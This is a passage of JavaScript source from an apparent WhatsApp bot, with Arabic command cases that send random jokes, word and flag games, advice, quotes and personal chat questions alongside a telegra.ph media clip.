"واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه؟ قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا. 🤓😂",
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 🤓😂",
"مره واحد اشترى فراخ..   علشان يربيها فى قفص صدره.🤓😂",
"مرة واحد من الفيوم مات..   أهله صوصوا عليه.🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه.🤓●",
"مره واحد شاط كرة فى المقص..   اتخرمت. 🤓😂",
"مرة واحد رايح لواحد صاحبه.. فا البواب وقفه بيقول له انت طالع لمين.. قاله طالع أسمر شوية لبابايا.. قاله يا أستاذ طالع لمين في العماره 🤓😂",
]
    const xeondkasawdfpo = kasawdfpo[Math.floor(Math.random() * kasawdfpo.length)]
    bufferkasawdfpo = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbkasawdfpo = [
        {buttonId: `kasawdfpo`, buttonText: {displayText: '⦁ تدوم الضحكة يقلبي 😂💕' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbkasawdfpo, image: bufferkasawdfpo, caption: ''+ xeondkasawdfpo }, {quoted:m})
    break
    case 'الاسرع': case 'ترتيب': case 'kkhhnhnye':    
    const kkhhnhnye =[
"س ر و ح",
"ه ر س ي ا",
"ل ب ا ت ق س ا",
"ه ق ن ف",
"و ن ف ا",
"خ ب ط م",
"س ت ا ن و ك ر ي",
 "ج ج ا د ه",
"ه م د ر س",
 "ن ا و ا ل",
 "غ ه ر ف",
"ج ه ت ل ا",
"ه ق ه و",
"ه ن ف ي س",
 "ه ط م ح",
"ر ا ط ي ه",
 "ر ا ر ا د",
 "ن ز م ل",
"ى ش س ف ت م",
"ر ب ك ه ا ء",
"ح ه ا ت ف",
 "ط ب و ا خ ط",
 "ن م و ل س",
 "ن ف ر س ا",
"ر ت ق ب ا ه ل",
 "ح ف ا ت",
"ب ش ا ك",
"ص ا ب",
"ك س م ه",
 "ب ا ب ذ",
"س ا ح و ب",
 "ح ا ه س",
 "ر ج س"
]
    const xeondkkhhnhnye = kkhhnhnye[Math.floor(Math.random() * kkhhnhnye.length)]
    bufferkkhhnhnye = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbkkhhnhnye = [
        {buttonId: `kkhhnhnye`, buttonText: {displayText: '⦁ لعب مرة اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbkkhhnhnye, image: bufferkkhhnhnye, caption: '*◍ اسرع واحد يرتبها »* '+ xeondkkhhnhnye }, {quoted:m})
    break
    case 'اعلام': case 'دول': case 'kkhhnhn':    
    const kkhhnhn =[
"🇪🇬",
"🇮🇶",
"🇸🇦",
 "🇩🇪",
"🇹🇳",
 "🇩🇿",
 "🇵🇸",
 "🇾🇪",
 "🇲🇦",
 "🇧🇭",
 "🇫🇷",
 "🇨🇭",
 "🇬🇧",
 "🇹🇷",
"🇨🇦",
 "🇰🇼",
 "🇱🇾",
"🇸🇩",
"🇸🇾"
]
    const xeondkkhhnhn = kkhhnhn[Math.floor(Math.random() * kkhhnhn.length)]
    bufferkkhhnhn = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbkkhhnhn = [
        {buttonId: `kkhhnhn`, buttonText: {displayText: '⦁ لعب مرة اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbkkhhnhn, image: bufferkkhhnhn, caption: '*◍ اسرع واحد يقول اسم الدولة  »* '+ xeondkkhhnhn }, {quoted:m})
    break
    case 'نصيحة': case 'انصحه': case 'انصحني': case 'انصح': case 'htgmcdv':    
    const htgmcdv =[
"عامل الناس بأخلاقك ولا بأخلاقهم", 
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
"لا تحقرون صغيره إن الجبال من الحصي",
"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
"لا تظلم حتى لا تتظلم ",
"لا تقف قصاد الريح ولا تمشي معها ",
"لا تكسب موده التحكم الا بالتعقل",
"لا تمد عينك في يد غيرك ",
"لا تملح الا لمن يستحقاها ويحافظ عليها",
"لا حياه للإنسان بلا نبات",
"لا حياه في الرزق.. ولا شفاعه في الموت",
"كما تدين تدان",
"لا دين لمن لا عهد له ",
"لا سلطان على الدوق فيما يحب أو بكره",
"لا مروه لمن لادين له ",
"لا يدخل الجنه من لايأمن من جازه بوائقه",
"يسروا ولا تعسروا... ويشورا ولا تنفروا",
"يدهم الصدر ما يبني العقل الواسع ",
"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
"أحياناً.. ويصبح الوهم حقيقه ",
"مينفعش تعاتب حد مبيعملش حساب لزعلك عشان متزعلش مرتين . ",
"السفر ومشاهده اماكن مختلفه وجديده ",
"عدم تضيع الفرص واسثمارها لحظه مجبئها ",
" اعطاء الاخرين اكثر من ما يتوقعون",
"معامله الناس بلطف ولكن عدم السماح لاحد بستغالال ذالك ",
"تكوين صدقات جديده مع الحفظ بلاصدقاء القودامي ",
"تعلم اصول المهنه بدلا من تضيع الوقت ف تعلم حيل المهنه ",
"مدح ع الاقل ثلاث اشخاص يوميا ",
"النظر ف عيون الشخاص عند مخاطبتهم ",
"التحلي بلسماح مع الاخرين او النفس ",
"الاكثار من قول كلمه شكرا ",
" مصافحه الاخرين بثبات وقوة ",
"الابتعاد عن المناطق السيئه السمعه لتجنب الاحداث السئه ",
" ادخار 10٪ع الاقل من الدخل",
" تجنب المخاوف من خلال التعلم من تجارب مختلفه",
" الحفاظ ع السمعه لانها اغلي ما يملك الانسان",
" تحويل الاعداء الي اصدقاء من خلال القيام بعمل جيد",
"لا تصدق كل ما تسمعع. ولا تنفق كل ما تمتلك . ولا تنم قدر ما ترغب ",
" اعتني بسمعتك جيدا فستثبت للك الايام انها اغلي ما تملك",
"حين تقول والدتك ستندم ع فعل ذالك ستندم عليه غالبا.. ",
" لا تخش العقبات الكبيره فخلفها تقع الفرص العظيمه",
"قد لا يتطلب الامر اكثر من شخص واحد لقلب حياتك رأس ع عقب ",
"اختر رفيقه حياتك بحرص فهو قرار سيشكل 90٪من سعادتك او بؤسك ",
" اقلب اداءك الاصدقاء بفعل شي جميل ومفجائ لهم",
"حين تدق الفرصه ع باباك ادعوها للبيت ",
"تعلم القواعد جيدا ثن اكسر بعدها ",
"احكم ع نجاحك من خلال قدرتك ع العطاء وليس الاخذ ",
" لا تتجاهل الشيطان مهما بدل ثيابه",
"ركز ع جعل الاشياء افضل وليس اكبر او اعظم ",
"كن سعيد  بما تمتلك واعمل لامتلاك ما تريد ",
"اعط الناس اكثر من ما يتوقعون ",
" لا تكن منشغل لدرجه عدم التعرف ع اصدقاء جدد",
"استحمه يوم العيد يمعفن🤓",
"مش تحب اي حد يقرب منك ",
" خليك مع البت راجل خليك تقيل🥥",
" انصح نفسك بنفسك بمت😆",
" كنت نصحت نفسي ياخويا??"
]
    const xeondhtgmcdv = htgmcdv[Math.floor(Math.random() * htgmcdv.length)]
    bufferhtgmcdv = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbhtgmcdv = [
        {buttonId: `htgmcdv`, buttonText: {displayText: '⦁ انصحني' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbhtgmcdv, image: bufferhtgmcdv, caption: '*◍ »* '+ xeondhtgmcdv }, {quoted:m})
    break
    case 'قصيده': case 'حكمه': case 'كتبات': case 'حكمة': case 'بوستات': case 'قصيدة': case 'htgmcdaa':    
    const htgmcdaa =[
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ", 
"‏من علامات جمال المرأة .. بختها المايل ! ",
"‏ انك الجميع و كل من احتل قلبي🫀🤍",
"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة. ● 💜",
"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
"‏ : كُلما أتبع قلبي يدلني إليك .",
"‏ : أيا ليت من تَهواه العينُ تلقاهُ .",
"‏ ‏: رغبتي في مُعانقتك عميقة جداً .●",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. ● ",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
"‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك.",
"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
"‏ جَبَرَ الله قلوبِكُم ، وقَلبِي .🍫",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖",
"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
"‏ أنا لستُ لأحد ولا احد لي ، أنا إنسان غريب أساعد من يحتاجني واختفي.",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ",
"‏ وانتهت صداقة الخمس سنوات بموقف.",
"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار.",
"‏مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙 ",
" مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙",
"فـ بالله صبر  وبالله يسر وبالله عون وبالله كل شيئ ♥️. ",
"أنا بعتز بنفسي جداً كصاحب وشايف اللي بيخسرني ، بيخسر أنضف وأجدع شخص ممكن يشوفه . ",
"فجأه جاتلى قافله ‏خلتنى مستعد أخسر أي حد من غير ما أندم عليه . ",
"‏اللهُم قوني بك حين يقِل صبري... ",
"‏يارب سهِل لنا كُل حاجة شايلين هَمها 💙‏ ",
"انا محتاج ايام حلوه بقي عشان مش نافع كدا ! ",
"المشكله مش اني باخد قررات غلط المشكله اني بفكر كويس فيها قبل ما اخدها .. ",
"تخيل وانت قاعد مخنوق كدا بتفكر فالمزاكره اللي مزكرتهاش تلاقي قرار الغاء الدراسه .. ",
" مكانوش يستحقوا المعافرة بأمانه.",
"‏جمل فترة في حياتي، كانت مع اكثر الناس الذين أذتني نفسيًا. ",
" ‏إحنا ليه مبنتحبش يعني فينا اي وحش!",
"أيام مُمله ومستقبل مجهول ونومٌ غير منتظموالأيامُ تمرُ ولا شيَ يتغير ", 
"عندما تهب ريح المصلحه سوف ياتي الجميع رتكدون تحت قدمك ❤️. ",
"عادي مهما تعادي اختك قد الدنيا ف عادي ❤. ",
"بقيت لوحدي بمعنا اي انا اصلا من زمان لوحدي.❤️ ",
"- ‏تجري حياتنا بما لاتشتهي أحلامنا ! ",
"تحملين كل هذا الجمال، ‏ألا تتعبين؟",
"البدايات للكل ، والثبات للصادقين ",
"مُؤخرًا اقتنعت بالجملة دي جدا : Private life always wins. ",
" الافراط في التسامح بيخللي الناس تستهين بيك🍍",
"مهما كنت كويس فـَ إنت معرض لـِ الاستبدال.. ",
"فخوره بنفسي جدًا رغم اني معملتش حاجه فـ حياتي تستحق الذكر والله . ",
"‏إسمها ليلة القدر لأنها تُغير الأقدار ,اللهُمَّ غير قدري لحالٍ تُحبه وعوضني خير .. ",
"فى احتمال كبير انها ليلة القدر ادعوا لنفسكم كتير وأدعو ربنا يشفى كل مريض. 💙 ",
"أنِر ظُلمتي، وامحُ خطيئتي، واقبل توبتي وأعتِق رقبتي يا اللّٰه. إنكَ عفوٌّ تُحِبُّ العفوَ؛ فاعفُ عني 💛 "
]
    const xeondhtgmcdaa = htgmcdaa[Math.floor(Math.random() * htgmcdaa.length)]
    bufferhtgmcdaa = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbhtgmcdaa = [
        {buttonId: `htgmcdaa`, buttonText: {displayText: '⦁ كتبات اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbhtgmcdaa, image: bufferhtgmcdaa, caption: '*◍»* '+ xeondhtgmcdaa }, {quoted:m})
    break
 
case 'كت': case 'تويت': case 'بكارتويت': case 'ndavgrfg':    
    const ndavgrfg =[
"اخر افلام شاهدتها", 
"مرتبط؟ ", 
" هل بتكراش ع حد في حياتك؟", 
" ينفع نرتبط؟", 
" ممكن توريني صوره بتحبها؟", 
" ممكن نبقي صحااب ع الفيس؟", 
" هل لسه بتحب الاكس؟", 
"عندك كام اكس في حياتك؟ ", 
"ينفع تبعتلي رقمك؟ ", 
" ما تيجي اعزمني ع حاجه بحبها؟", 
"ينفع احضنك؟ ", 
"قولي ع اكبر غلطه ندمان عليهاا؟ ", 
"عندك كام سنه؟ ", 
" عامل بلوك لكام واحد عندك؟", 
" قولي سر محدش يعرفه؟", 
" عندك كام اكس في حياتك؟", 
"بتعرف تقلش وتهزر؟ ", 
" لونك المفضل هو؟", 
" مين أقرب حد ليك الفتره دي ؟", 
" قولي ع اكبر غلطه ندمان عليهاا؟", 
" مين مغنيك المفضل؟", 
" حابب تبقي اي في المستقبل؟", 
"راضي عن حياتك بنسبه كام؟ ", 
"اكتر حاجه بتلفت انتباهك في البنت او الولد؟ ", 
"اي رأيك في صوره البروفايل بتاعتي؟ ", 
" هل باين عليا اني شخص لطيف؟", 
" توافق ترجع للاكس؟", 
"ممكن تضحي بحياتك لمين؟ ", 
"سافرت بلاد برا مصر واي هي؟ ", 
" اي رأيك في صوره البروفايل بتاعتي؟", 
" هل بتعتبر نفسك حلو وبتحب شكلك؟", 
" نفسك تزور انهي بلد في العالم؟", 
" شخصيه ع السوشيال شايف انها مميزه؟", 
"عندك فوبيا من اي؟ ", 
" ممكن تورينا لينك الصراحه؟", 
"عمرك عيطت ع حاجه؟ ", 
" شايف اي أسوأ صفه فيك؟", 
"هل شلت مواد قبل كد وعدت السنه؟ ", 
"بتغير ع الل بتحبهم وبيبان عليك لو غيرت؟ ", 
"معاك كام فلوس دلوقتي؟ ", 
" بتفضل صحابك البنات ولا الولاد؟", 
" مسامح الل ظلمك؟", 
" ممثلك الافضل؟", 
" ممكن تقول رساله لحد مش هيشوفها؟", 
"انت اهلاوي ولا زملكاوي؟ ", 
" اي حيوانك المفضل؟", 
"اخر افلام شاهدتها", 
"بتعرف تكلم لغه تانيه واي هي؟ ", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس ناسا ؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس ناسا ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
" ايه رايك في المطور ليدو ؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"آخر مره ضربت عشره كانت متى ؟", 
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
" بستخدم واتساب من كام سنة ؟",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالواتساب؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
  "تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "هل انت حرامي تويت بتعت بودي؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغيرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
   "هل بودي لطيف؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغيره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
